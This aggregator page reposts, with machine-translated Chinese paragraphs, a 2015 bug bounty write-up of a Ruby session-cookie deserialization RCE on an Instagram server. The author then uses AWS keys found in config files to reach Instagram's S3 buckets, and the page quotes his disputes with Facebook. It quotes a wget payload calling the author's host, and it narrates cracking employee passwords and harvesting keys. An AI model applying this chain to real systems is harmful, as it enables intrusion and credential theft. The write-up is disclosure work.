<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Instagram的百万美元大虫（2015） Instagram's Million Dollar Bug (2015)</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Instagram's Million Dollar Bug (2015)<br/>Instagram的百万美元大虫（2015） </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-12-15 05:15:35</div><div class="page_narrow text-break page_content"><p>In 2012, Bloomberg published a somewhat famous (at least to bug bounty participants) article on Facebook&#39;s &#34;Whitehat&#34; bug bounty program. In  this article, Facebook is quoted as saying:  &#34;If there&#39;s a million-dollar bug, we will pay it out&#34;. My apologies in advance if that makes for too much of a click-bait title, but it&#39;s important background for this write-up. As it turns out, I   did find a &#34;million-dollar bug&#34; in Instagram (specifically I gained access to a lot of data including SSL certs, source code, photos, etc), but that&#39;s really only the start to the story. Before I get too far ahead of myself, I should make note of a few things:  I&#39;ve found and reported a couple hundred vulnerabilities through bug bounty programs with almost no drama</p><p>2012年，彭博社（Bloomberg）在Facebook的Whitehat（Whitehat）上发表了一篇颇有名气的文章（至少对bug赏金参与者如此）。错误赏金计划。在这篇文章中，引用了Facebook的说法：如果存在一个百万美元的错误，我们将予以赔付。如果造成过多的点击诱饵标题，我事先表示歉意，但这是本文撰写的重要背景。事实证明，我确实发现了一个＆＃34;美元的bug＆＃34;在Instagram中（特别是我可以访问很多数据，包括SSL证书，源代码，照片等），但这实际上只是故事的开始。在我超越自我之前，我应该记下以下几件事：我已经通过漏洞赏金计划发现并报告了数百个漏洞，几乎没有戏剧性</p><p> This is my introduction, because in many ways, I wish I wasn&#39;t making this write-up. I have seen a lot of people who take to Twitter or their personal blog to complain about companies or to stir up drama. In some cases going public about an issue is completely justified and valuable, but I&#39;d really rather focus my efforts on technical findings. To  quote Alex Stamos  &#34;The disconnect between drama-stirring &#39;community&#39; and the people that actually get it done, at scale, against real adversaries is... amusing&#34;. Since I haven&#39;t ever posted anything from my Twitter account (and you can&#39;t have drama without Twitter), I can only assume that I&#39;m not part of the drama-stirring community.</p><p> 这是我的介绍，因为我希望在很多方面都不会写这篇文章。我见过很多人到Twitter或他们的个人博客上抱怨公司或煽动戏剧。在某些情况下，公开解决某个问题是完全合理且有价值的，但我确实宁愿将精力集中在技术发现上。引用亚历克斯·斯塔莫斯（Alex Stamos）的话说：而真正与反对者进行大规模对抗的人真是可笑。由于我从未在自己的Twitter帐户中发布过任何内容（而且如果没有Twitter，您将无法获得任何戏剧表演），因此我只能假定我不属于那些引人入胜的戏剧界。</p><p>   This write-up is going to get somewhat long and complicated, so here&#39;s a list of sections, feel free to jump to the interesting ones. It&#39;s split into two parts, one technical, the other covering my interactions with Facebook and the drama that results. Feel free to just read it all :)</p><p>   这篇文章将变得有些冗长和复杂，因此这里是各节的列表，您可以随时跳转到有趣的部分。它分为两个部分，一个是技术性的，另一个是我与Facebook的互动以及由此产生的戏剧。随意阅读所有内容:)</p><p>       My findings all start more or less as all good vulnerabilities should, with a hot tip on IRC. A friend (still need confirmation whether or not they would like to be named) of a friend mentioned they had been testing Instagram as part of Facebook&#39;s bug bounty program. I did a small amount of testing for Facebook&#39;s bug bounty last year (you can find my name  here), so I was interested in doing some further testing. The company I work for has given me permission to participate in bug bounties on my own time, so I take advantage of that when I can find some free time. In this case, my friend had found what he thought might be a vulnerable server, which was  https://sensu.instagram.com. He told me that the fact that the server was internet accessible had been reported to Facebook as basically an &#34;open admin panel&#34;. He also listed in his report that it was possibly vulnerable to a Ruby password reset flaw, although he had not actually reproduced that behaviour. I imagine he was referring to CVE-2013-3221, better described in  this Phrack article. Since he had already reported the vulnerability (that the server was exposed to the internet), he said I could take a look and see if I could find anything further, and asked that I keep the initial issue which he had reported private.</p><p>       我的发现或多或少都始于所有好的漏洞，并在IRC上有一个热门提示。一位朋友的朋友（仍然需要确认是否愿意透露姓名）提到他们已经在测试Facebook，这是Facebook的漏洞赏金计划的一部分。去年，我针对Facebook的漏洞赏金做了少量测试（您可以在此处找到我的名字），因此我有兴趣进行一些进一步的测试。我所工作的公司已允许我自己参加bug赏金活动，因此当我有空的时候可以利用它。在这种情况下，我的朋友发现了他认为可能是易受攻击的服务器，即https://sensu.instagram.com。他告诉我，该服务器可以通过Internet访问的事实已经报告给Facebook，基本上是“开放管理面板”。他还在报告中列出了该漏洞可能很容易受到Ruby密码重置漏洞的影响，尽管他实际上并未复制该行为。我想他指的是CVE-2013-3221，在这篇Phrack文章中有更好的描述。由于他已经报告了该漏洞（服务器已暴露于互联网），他说我可以看看是否可以找到进一步的内容，并要求我将最初报告的问题保密。</p><p>   Based on the initial tip, I attempted to see if there was any way I could leverage a password reset weakness in the Ruby app. Initial tests didn&#39;t seem very promising. The regular login page didn&#39;t accept a value of &#34;0&#34; for the password, and it wasn&#39;t clear what format a password reset email would use. I didn&#39;t recognize it, but it seemed like the Ruby app might be based on some standard Sensu management system. So, to attempt to uncover the password reset format, I tracked down the web app on Google as  &#34;Sensu-Admin&#34;. Finding this app helped, but I still wasn&#39;t seeing anything obvious regarding a password reset vulnerability. Whatever my friend had suspected didn&#39;t seem to apply here.</p><p>   根据最初的技巧，我尝试查看是否有任何方法可以利用Ruby应用程序中的密码重置漏洞。最初的测试似乎没有什么希望。常规登录页面不接受值＆＃34; 0＆＃34;。输入密码，还不清楚密码重置电子邮件将使用哪种格式。我不认识它，但似乎Ruby应用程序可能基于某些标准的Sensu管理系统。因此，为了尝试发现密码重置格式，我在Google上以＆＃34; Sensu-Admin＆＃34;的形式跟踪了该网络应用。找到此应用程序很有帮助，但是我仍然没有看到关于密码重置漏洞的任何明显信息。我的朋友所怀疑的一切似乎都没有在这里适用。</p><p> Finding the app on Github did, however, lead to an even better finding. The file  secret_token.rb on Github had a Ruby secret token hardcoded. It seemed unlikely that Instagram would leave that token the same on their server, but if they did, I would be able to spoof session cookies. The Phrack article I linked earlier explains that not only can cookies be spoofed, but that it may also be possible to use Ruby&#39;s deserialization of session cookies to directly trigger code execution.</p><p> 但是，在Github上找到该应用确实带来了更好的发现。 Github上的secret_token.rb文件具有硬编码的Ruby秘密令牌。 Instagram似乎不太可能在服务器上保留该令牌，但如果这样做，我将能够欺骗会话cookie。我之前链接的Phrack文章解释说，不仅可以欺骗cookie，而且还可以使用Ruby对会话cookie的反序列化来直接触发代码执行。</p><p> Testing for a deserialization vulnerability isn&#39;t always the most straight-forward process, so I first configured a local Ruby instance to test out my code. Next, I used the examples shown here as a framework:   https://github.com/charliesome/charlie.bz/blob/master/posts/rails-3.2.10-remote-code-execution.md</p><p> 测试反序列化漏洞并不总是最简单的过程，因此我首先配置了一个本地Ruby实例来测试我的代码。接下来，我使用此处显示的示例作为框架：https://github.com/charliesome/charlie.bz/blob/master/posts/rails-3.2.10-remote-code-execution.md </p><p> I then took an object I created, and ran it through Marshal.load to run it directly. As expected, when loading the serialized object locally, the command I embedded was executed. Next, I took the same object, and signed it using the secret key from Sensu-Admin. The signature and the payload were combined into a Sensu-Admin cookie. An example cookie is the following:</p><p>然后，我拿了一个我创建的对象，并通过Marshal.load运行它以直接运行它。不出所料，在本地加载序列化对象时，执行了我嵌入的命令。接下来，我获取了同一对象，并使用Sensu-Admin的密钥对其进行了签名。签名和有效载荷被组合到一个Sensu-Admin cookie中。 Cookie的示例如下：</p><p> With the cookie crafted, I then sent it out to the server. Excitingly the server actually deserialized the cookie, matched the signature properly, and ran the payload. The payload in the above cookie is  &#34;wget http://exfiltrated.com/test-instagram&#34;, and sure enough I saw the sensu.instagram.com server reach out and retrieve that URL from my server! Since I now had a reliable RCE, I set up a listening socket, and next instructed a remote shell to be launched. The result is shown below:</p><p> 制作完Cookie后，我将其发送到服务器。令人兴奋的是，服务器实际上反序列化了cookie，正确匹配了签名，并运行了有效负载。上面cookie中的有效负载是＆＃34; wget http://exfiltrated.com/test-instagram&#34 ;，而且我确信sensen.instagram.com服务器已经伸出手并从我的服务器中检索了该URL！由于我现在有了可靠的RCE，因此我建立了一个监听套接字，然后指示启动一个远程Shell。结果如下所示：</p><p>  With the RCE fully confirmed, I submitted a write-up of the vulnerability to Facebook. In my write-up I noted that there were really two vulnerabilities: The host sensu.instagram.com is running Ruby 3.x, which is susceptible to code execution via the Ruby session cookie. This can only take place if a valid authentication hash can be generated for the malicious session cookie.</p><p>  在完全确认RCE的情况下，我向Facebook提交了该漏洞的摘要。在我的文章中，我指出确实存在两个漏洞：主机sensu.instagram.com正在运行Ruby 3.x，该漏洞很容易通过Ruby会话cookie执行代码。仅当可以为恶意会话cookie生成有效的身份验证哈希时，才会发生这种情况。</p><p>   Finding a RCE isn&#39;t all that rare, but I wanted to confirm that I was still in scope for Facebook&#39;s bounty program, as everyone has their own terms and conditions. Facebook&#39;s rules, listed here:  https://www.facebook.com/whitehat seemed to fairly clearly indicate that I should avoid any actions that might cause downtime, but that they were interested in any vulnerabilities that would  &#34;enable access to a system within our infrastructure&#34;. So it looked like I was still in the clear.</p><p>   找到RCE并不是很罕见，但是我想确认我仍然在Facebook的赏金计划范围之内，因为每个人都有自己的条款和条件。 Facebook的规则（在此处列出）：https://www.facebook.com/whitehat似乎很清楚地表明，我应该避免任何可能导致停机的操作，但是他们对可能会导致＆＃34的任何漏洞感兴趣;启用对我们基础架构中系统的访问权限。因此，看起来我仍处于透明状态。</p><p> As described above, I used the web interface to gain code execution, but at this point I still hadn&#39;t actually gained access to the web interface as a normal user. Since this web interface was public, the next obvious area of potential weakness was the user accounts who could log in to the system. The Sensu-Admin application can make use of any number of database configurations, and the Instagram instance just simply used a local Postgres DB instance. With the RCE it was simple to read the configuration file to gain the credentials necessary for this database. I connected and dumped the contents of the users table. As expected this consisted entirely of employee accounts, a mix of both Instagram and Facebook employees. In total, approximately 60 accounts were present. Unfortunately for me (but good from a security perspective), all user passwords were encrypted using bcrypt. My machine cracks this password type at around 250 attempts a second, which is extremely slow when it comes to password cracking. Having come this far however, I loaded all the passwords into JtR, and kicked it off. To my surprised, passwords immediately came back. In only a few minutes of password cracking, I had recovered 12 passwords! These passwords were all extremely weak, which is why I was able to crack them despite them being bcrypt encrypted:</p><p> 如上所述，我使用Web界面来执行代码，但是在这一点上，我仍然没有以普通用户的身份实际访问Web界面。由于此Web界面是公开的，因此下一个潜在的弱点是可以登录系统的用户帐户。 Sensu-Admin应用程序可以使用任何数量的数据库配置，Instagram实例仅使用本地Postgres数据库实例。使用RCE，很容易读取配置文件以获得该数据库所需的凭据。我连接并转储了用户表的内容。正如预期的那样，这完全由员工帐户组成，包括Instagram和Facebook员工。总共大约有60个帐户。对我来说不幸的是（但从安全角度来看还是不错的），所有用户密码都是使用bcrypt加密的。我的机器以每秒约250次尝试的速度破解此密码类型，这在密码破解方面非常慢。然而，到目前为止，我将所有密码都加载到了JtR中并开始了。令我惊讶的是，密码立即返回。在破解密码的短短几分钟内，我已恢复了12个密码！这些密码都非常弱，这就是为什么尽管对它们进行了bcrypt加密，但还是能够破解它们：</p><p> This was somewhat shocking to see on a production system, especially one that was internet accessible. I choose one of the accounts, and confirmed that it indeed worked by logging in to the web interface. A screenshot of this can be seen below:</p><p> 在生产系统（尤其是可通过Internet访问的生产系统）上看到该消息有些令人震惊。我选择其中一个帐户，并通过登录Web界面确认它确实有效。屏幕截图如下：</p><p>  Since the Facebook Whitehat rules indicated that I should avoid anything that could cause downtime, I did not attempt to make any changes or explore this web interface in any detail. Instead, I created a second write-up describing the weak user accounts, and submitted that as a new vulnerability to Facebook.</p><p>  由于Facebook Whitehat规则表明我应避免任何可能导致停机的事情，因此我没有尝试进行任何更改或详细研究此Web界面。相反，我创建了第二篇描述弱用户帐户的文章，并将其作为新漏洞提交给Facebook。 </p><p>   In my initial vulnerability submission (the Sensu-Admin RCE), I asked whether I should attempt to access further internal network systems. The Sensu-Admin server was running in EC2, and rather than using an internal DNS server, a list of over 1,400 systems was instead hard-coded into the /etc/hosts file. As far as I could see, there were a lot of places I could attempt to pivot to, but at the same time, I was curious what Facebook&#39;s reaction would be.</p><p>在我最初提交的漏洞（Sensu-Admin RCE）中，我询问是否应尝试访问其他内部网络系统。 Sensu-Admin服务器运行在EC2中，而不是使用内部DNS服务器，而是将超过1400个系统的列表硬编码到/ etc / hosts文件中。据我所知，我有很多地方可以尝试转向，但与此同时，我很好奇Facebook的反应。</p><p> Quite a few bounty programs which I have participated in have informed me that pivoting to other systems should not be possible (or at least not easy), and so have either told me not to waste time trying, or that they&#39;d be really interested if I was able to. In this case, after a few days Facebook simply firewalled access to the sensu.instagram.com server entirely, and never provided an answer as to whether or not I should have immediately gone after some internal systems. It will forever be a mystery whether or not I could have pivoted to more important / exciting systems.</p><p> 我参与了很多赏金计划，这些计划告诉我，转向其他系统不应该（或者至少不容易），因此要么告诉我不要浪费时间，要么我真的很感兴趣。在这种情况下，几天后，Facebook只是将访问sensu.instagram.com服务器的访问完全防火墙了，却没有提供有关我是否应该立即使用某些内部系统的答案。无论我是否能够转向更重要/令人兴奋的系统，将永远是一个谜。</p><p>   At this point, I was quite pleased with my progress. I had basically found three fairly solid vulnerabilities, which I had combined into two vulnerability submissions. Most companies who run bug bounties pay comparatively well for RCE vulnerabilities, and I expected that these vulnerabilities would also make a fairly interesting writeup. Less than a month ago, I had found  a great vulnerability in Microsoft Live.com, and this looked to be even better. Of course, the story doesn&#39;t end here. While looking for any obvious configuration weaknesses on the sensu.instagram.com server, I had looked at the server configuration file:  /etc/sensu/config.json</p><p>   在这一点上，我对自己的进步感到非常满意。我基本上发现了三个相当可靠的漏洞，将它们合并为两个漏洞提交。多数有漏洞赏金的公司为RCE漏洞支付了相对较高的费用，我希望这些漏洞也会带来相当有趣的内容。不到一个月前，我在Microsoft Live.com中发现了一个很大的漏洞，而且看起来情况甚至更好。当然，故事还没有到此结束。在sensu.instagram.com服务器上查找任何明显的配置缺陷时，我查看了服务器配置文件：/etc/sensu/config.json</p><p> That configuration file has contained the database credentials (as described above), but also included other credentials. These include an email account and a bunch of Pagerduty keys. I thought that Pagerduty alerts indicating that servers were on fire, or that armed monkeys had commandeered the data center could be hilarious, but also pretty hard to justify, so I held off. While not listed as such, there was a fairly obvious AWS key-pair also present in the file as part of the command to start the  &#34;autoscale&#34; process. Having looked at local user accounts, this key seemed like the next obvious thing to take a look at.</p><p> 该配置文件包含数据库凭据（如上所述），但还包含其他凭据。其中包括一个电子邮件帐户和一堆Pagerduty密钥。我以为Pagerduty警报表明服务器着火了，或者武装猴子抢占了数据中心可能很有趣，但也很难辩解，所以我选择了。虽然没有这样列出，但文件中还存在一个相当明显的AWS密钥对，作为启动＆＃34; autoscale＆＃34;的命令的一部分。处理。查看本地用户帐户后，此密钥似乎是接下来要研究的显而易见的事情。</p><p> AWS keys can provide access to many different AWS services, but I generally start by looking at what, if any access to Amazon S3 that a key provides. In this case the key-pair listed  82 different S3 buckets as associated. After looking through a sampling of these buckets, I discovered that access to all of them was blocked. I could see the bucket names, but not list or access the contents. The exception to this was the very first bucket, the  &#34;autoscale-kitchen&#34; bucket.</p><p> AWS密钥可以提供对许多不同的AWS服务的访问，但我通常首先查看密钥提供的对Amazon S3的访问权限（如果有的话）。在这种情况下，密钥对列出了82个相关的S3存储桶。浏览了这些存储桶的样本后，我发现对所有存储桶的访问均被阻止。我可以看到存储桶名称，但看不到列表或访问其中的内容。唯一的例外是第一个存储桶，即＆scalescale-kitchen＆＃34;桶。</p><p> The autoscale-kitchen bucket followed what I&#39;ve seen as pretty typical in a &#34;dev-ops&#34; setup. There was a  autoscale-kitchen-latest.tar.gz, and then a bunch of past revisions (maybe a hundred or so). I downloaded and opened the latest, and it more or less appeared to contain deployment scripts for installing various services. I might have missed something, but nothing seemed overly sensitive in it. I next downloaded a much older version of the  autoscale-kitchen file. The contents of this file were actually quite similar, but there was also a Vagrant config file included. This config file contained a bunch of additional settings, and most notably, a second AWS keypair.</p><p> 自动秤式厨房存储桶遵循了我在开发设备中看到的非常典型的样子。设定。有一个autoscale-kitchen-latest.tar.gz，然后是一堆过去的修订版（可能是一百个左右）。我下载并打开了最新版本，它或多或少似乎包含用于安装各种服务的部署脚本。我可能错过了一些东西，但是似乎没有什么过于敏感的。接下来，我下载了较旧版本的autoscale-kitchen文件。这个文件的内容实际上非常相似，但是其中包含一个Vagrant配置文件。此配置文件包含许多其他设置，最值得注意的是第二个AWS密钥对。</p><p> I configured my S3 client to use the new keypair, and similar to before, I could again see 82 S3 buckets. This time, however, I could read the contents of  every single bucket!</p><p> 我将S3客户端配置为使用新的密钥对，并且与之前类似，我可以再次看到82个S3存储桶。但这一次，我可以读取每个存储桶中的内容！ </p><p>   With the newly obtained AWS key, I browsed several buckets. There appeared to be a lot of potentially sensitive content, but a lot of it was just more versioned tar archives of tools and web applications. I queued up several buckets to download, and went to bed for the night.</p><p>使用新获得的AWS密钥，我浏览了多个存储桶。似乎有很多潜在的敏感内容，但是很多只是工具和Web应用程序的更高版本的tar存档。我排队好几个水桶下载，然后整夜上床睡觉。</p><p> The next day, I began to go through some of what I&#39;d downloaded, and some of the remaining buckets. There were quite a few S3 buckets dedicated to storing users&#39; Instagram images, both pre and post processing. Since the Faceboook Whitehat rules state that researchers need to  &#34;make a good faith effort to avoid privacy violations&#34;, I avoided downloading any content from those buckets. The remaining buckets however proved to be extremely valuable.</p><p> 第二天，我开始浏览一些我下载的内容以及剩余的存储桶。有很多专用于存储用户的S3存储桶。 Instagram图像，包括前处理和后处理。由于Faceboook Whitehat规则规定研究人员需要“真诚”努力避免侵犯隐私的行为，因此我避免从这些存储桶中下载任何内容。然而，剩下的水桶被证明是非常有价值的。</p><p> The following is the types of data that was available all using one AWS keypair, although the data was spread across multiple buckets: Source code for fairly recent versions of the Instagram server backend, covering all API endpoints, some image processing libraries, etc.</p><p> 以下是使用一个AWS密钥对可全部使用的数据类型，尽管该数据分散在多个存储桶中：Instagram服务器后端的最新版本的源代码，涵盖所有API端点，某些图像处理库等。</p><p> To say that I had gained access to basically all of Instagram&#39;s secret key material would probably be a fair statement. With the keys I obtained, I could now easily impersonate Instagram, or impersonate any valid user or staff member. While out of scope, I would have easily been able to gain full access to any user&#39;s account, private pictures and data. It is unclear how easy it would be to use the information I gained to then compromise the underlying servers, but it definitely opened up a lot of opportunities.</p><p> 说我基本上可以访问Instagram的所有秘密密钥材料，可能是一个公平的声明。使用获得的密钥，我现在可以轻松地模拟Instagram，或模拟任何有效的用户或工作人员。尽管超出范围，但我将能够轻松获得对任何用户帐户，私人图片和数据的完全访问权限。尚不清楚使用我获得的信息来破坏底层服务器有多容易，但它无疑带来了很多机会。</p><p> My vulnerability submission for this third finding included 7 different issues, all of which contributed to how much data I could access. These were:</p><p> 我针对第三个发现提交的漏洞包括7个不同的问题，所有这些问题都导致我可以访问多少数据。这些曾经是：</p><p> AWS bucket contain credentials for other buckets (specifically autoscale-kitchen). This is a classic privilege escalation weakness</p><p> AWS存储桶包含其他存储桶的凭据（特别是autoscale-kitchen）。这是经典的特权升级弱点</p><p> No access segregation on AWS credentials. Using one set of AWS keys I was able to access all S3 buckets.</p><p> 在AWS凭证上没有访问隔离。使用一组AWS密钥，我可以访问所有S3存储桶。 </p><p> &#34;Secret keys&#34; stored throughout S3 buckets. This is furthered by the fact that some buckets no longer contain keys in their latest application version, but the bucket contains all previous application versions. These keys do not appear to be separated properly so that one application can only access keys appropriate to its application, but they are spread out across multiple buckets</p><p>＆＃34;秘密键＆＃34;存储在整个S3存储桶中。由于某些存储桶在其最新的应用程序版本中不再包含密钥，而该存储桶包含所有先前的应用程序版本，因此进一步促进了这一点。这些密钥似乎没有正确分开，因此一个应用程序只能访问与其应用程序相对应的密钥，但是它们分散在多个存储桶中</p><p> Files stored in some buckets are encrypted to passwords also stored in the same bucket (or accessible via the same AWS key)</p><p> 存储在某些存储桶中的文件被加密为密码，该密码也存储在同一存储桶中（或可通过同一AWS密钥访问）</p><p>  If audit logging takes place, it is not monitored in any way as none of my access was detected (as far as I am aware).</p><p>  如果发生了审核日志记录，则不会以任何方式对其进行监视，因为没有检测到我的访问权限（据我所知）。</p><p>   When discussing the compromise of multiple systems, sometimes a diagram can help clarify things. As such, I have made a MS Paint image to show the steps which were taking to successfully compromise Instagram&#39;s systems:</p><p>   在讨论多个系统的危害时，有时图表可以帮助您弄清楚。因此，我制作了一张MS Paint图片，以显示成功破坏Instagram系统所采取的步骤：</p><p> Essentially all findings started from an RCE on the server sensu.instagram.com. This RCE was possible due to the reuse of a Ruby secret key, and the fact that the version of Ruby allows for code execution through object deserialization. From this RCE, it was observed that the server also was configured with several users who had extremely weak passwords.</p><p> 基本上所有发现都来自于sensu.instagram.com服务器上的RCE。由于可以重新使用Ruby密钥，并且该版本的Ruby允许通过对象反序列化来执行代码，因此可以实现该RCE。从该RCE中可以看出，该服务器还配置了多个密码非常弱的用户。</p><p> The configuration file present (and readable by the web server) on sensu.instagram.com contained an AWS keypair. This keypair could read from a S3 bucket, which contained a second AWS keypair. This second keypair was discovered to have access to all (or at least all important) Instagram S3 buckets.</p><p> sensu.instagram.com上存在的配置文件（可由Web服务器读取）包含AWS密钥对。该密钥对可以从S3存储桶中读取，其中包含第二个AWS密钥对。发现第二个密钥对可以访问所有（或至少所有重要的）Instagram S3存储桶。</p><p> If you&#39;ve read carefully, you might have noticed that while the RCE was somewhat elaborate, to pivot and take control of Instagram&#39;s S3 buckets really involved no technical vulnerabilities. This was a huge surprise to me, considering that Facebook (and thus Instagram) should be a very mature company when it comes to security configurations and procedures. A basic principle that everyone in infosec learns while they&#39;re still in school in the principle of defense-in-depth. The compromise of one server should never result in the compromise of your whole company, yet that&#39;s exactly what happened here. The findings described above all took place in less than a week (the timeline at the end of this write-up shows this in more detail). The response from Facebook to the first vulnerability which I reported (the RCE) was simply  &#34;Thank you for reporting this information to us. We are sending it to the appropriate product team for further investigation. We will keep you updated on our progress.&#34; The response to the second vulnerability (the weak accounts) is where things took an unexpected turn.</p><p> 如果您已仔细阅读，您可能会注意到，尽管RCE有点复杂，但枢转并控制Instagram的S3存储桶确实不涉及任何技术漏洞。考虑到Facebook（以及Instagram）在安全配置和程序方面应该是一家非常成熟的公司，这让我感到非常惊讶。信息安全中的每个人都按照纵深防御的原则在校期间学习的基本原则。一台服务器的危害永远不会导致整个公司的危害，但这正是这里发生的事情。上面描述的发现都在不到一周的时间内发生了（本文结尾的时间表更详细地说明了这一点）。 Facebook对我报告的第一个漏洞（RCE）的答复只是＆＃34;谢谢您向我们报告此信息。我们会将其发送给适当的产品团队进行进一步调查。我们将为您提供最新进展。＆＃34;对第二个漏洞（弱势帐户）的响应是事情发生了意外的转变。 </p><p> Rather than summarize my interactions surrounding vulnerability #2 (weak logins), I think it&#39;s more transparent to simply include the full transcript here.</p><p>我认为，与其总结我围绕漏洞2（弱登录）的互动，不如简单地在此处包含完整的笔录更加透明。</p><p>  We sent you a messageOct 28Hi Wesley,Thank you for reporting this information to us. We are sending it to the appropriate product team for further investigation. We will keep you updated on our progress.Please be mindful that taking additional action after locating a bug violates our bounty policy. In the future we expect you will make a good faith effort to avoid privacy violations, destruction of data, and interruption or degradation of our service during your research.Thanks,AliSecurityFacebook</p><p>  我们给您发送了一条消息10月28日韦斯利，谢谢您向我们报告此信息。我们会将其发送给适当的产品团队进行进一步调查。我们会及时通知您最新的进展。请注意，在发现错误后采取其他措施会违反我们的赏金政策。将来，我们希望您能真诚地努力避免在研究过程中违反隐私权，破坏数据以及服务中断或降级.AliSecurityFacebook</p><p> What you submittedOct 28Hi,Thanks for the reply. As I noted in my submission, I did specifically make an effort not to tamper with the system. When you note:&#34;Please be mindful that taking additional action after locating a bug violates our bounty policy.&#34;Can you explain where in the policy that is described. I spent a while searching to see if I could better understand the terms and conditions, and what you further note is really all I could find:&#34;make a good faith effort to avoid privacy violations, destruction of data, and interruption or degradation of our service during your research.&#34;Of that list, there was definitely, no &#34;destruction of data&#34;, there should not have been any &#34;interruption or degradation of service&#34; due to my actions, leaving the last item of &#34;privacy violations&#34;. In regards to that item, it appears to be further explained in the terms and conditions and I basically interpret that to mean &#34;don&#39;t access user data&#34;. With that said, I definitely aim to comply with all the rules around your bug bounty program, so if you could explain further what actions would be permitted when a vulnerability is found, and what actions would not, that would be helpful. As an example, if I find a SSRF vulnerability that lets me tunnel traffic to internal servers, am I allowed to attempt to find vulnerabilities within those servers? Or as another example, say I find what appears to be the configuration file for a CMS system. Am I allowed to confirm that the credentials stored in the configuration file are valid? Would I be allowed to use those credentials to attempt to gain further access to the system?All of the above examples seem like they would provide valuable results to Facebook, and as far as I can see, aren&#39;t against any of the terms and conditions. If, however, those actions would not be desired by Facebook, please do let me know so that I can better understand how to structure my testing against Facebook and its subsidiaries!Thanks,Wes</p><p> 您提交的内容10月28日您好，感谢您的回复。正如我在提交的文件中指出的那样，我确实做出了不破坏系统的努力。当您注意：＆＃34;请注意，在发现错误后采取其他措施违反了我们的赏金政策。您能解释一下所描述政策中的何处。我花了一段时间寻找我是否可以更好地理解这些条款和条件，您还要进一步注意的是，实际上我可以找到所有信息：＆＃34;尽最大努力避免隐私权受到侵犯，数据遭到破坏以及中断或在您进行研究期间，我们的服务质量会下降。在该列表中，绝对没有＆＃34;数据遭到破坏；＆＃34;服务不会出现任何中断或下降。由于我的行为，留下了“侵犯隐私权”的最后一项。关于该项目，它似乎在条款和条件中得到了进一步的解释，我基本上将其解释为“不要访问用户数据”。话虽这么说，我的目标绝对是遵守您的漏洞赏金计划的所有规则，因此，如果您可以进一步解释发现漏洞时将允许采取什么措施，而不采取什么措施，这将有所帮助。例如，如果我发现一个SSRF漏洞，该漏洞使我可以将流量隧道传输到内部服务器，是否可以尝试在这些服务器中查找漏洞？或作为另一个示例，说我发现似乎是CMS系统的配置文件。是否可以确认配置文件中存储的凭据有效？是否允许我使用这些凭据来尝试进一步访问该系统？上述所有示例似乎都可以为Facebook提供有价值的结果，而且据我所知，并不反对任何一种条款和条件。但是，如果Facebook不希望采取这些措施，请告诉我，以便我更好地了解如何针对Facebook及其子公司构建测试！谢谢，Wes</p><p> We sent you a messageNov 6Hi Wesley,As a researcher on the Facebook program, the expectation is that you report a vulnerability as soon as you find it. We discourage escalating or trying to escalate access as doing so might make your report ineligible for a bounty. Our team accesses the severity of the reported vulnerability and we typically pay based on its potential use rather than rely on what&#39;s been demonstrated by the researcher.Thanks,ReginaldoSecurity</p><p> 我们向您发送了一条消息11月6日韦斯利，作为Facebook程序的研究员，期望您在发现漏洞后立即举报该漏洞。我们不鼓励升级或尝试升级访问权限，因为这样做可能会使您的报告不符合赏金资格。我们的团队会访问所报告漏洞的严重性，我们通常根据漏洞的潜在用途进行支付，而不是依赖于研究人员的证明。ReginaldoSecurity</p><p> What you submittedNov 6Thanks for the clarifications. Many bounty programs like to see what impact is possible from a vulnerability, which was my assumption with this issue.The clarifications</p><p> 您提交的内容11月6日感谢您的澄清。许多赏金计划喜欢查看漏洞可能带来的影响，这是我对此问题的假设。</p><p>......</p><p>...... </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://web.archive.org/web/20151217205414/http://www.exfiltrated.com/research-Instagram-RCE.php">https://web.archive.org/web/20151217205414/http://www.exfiltrated.com/research-Instagram-RCE.php</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/instagram/">#instagram</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/million/">#million</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/漏洞/">#漏洞</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn 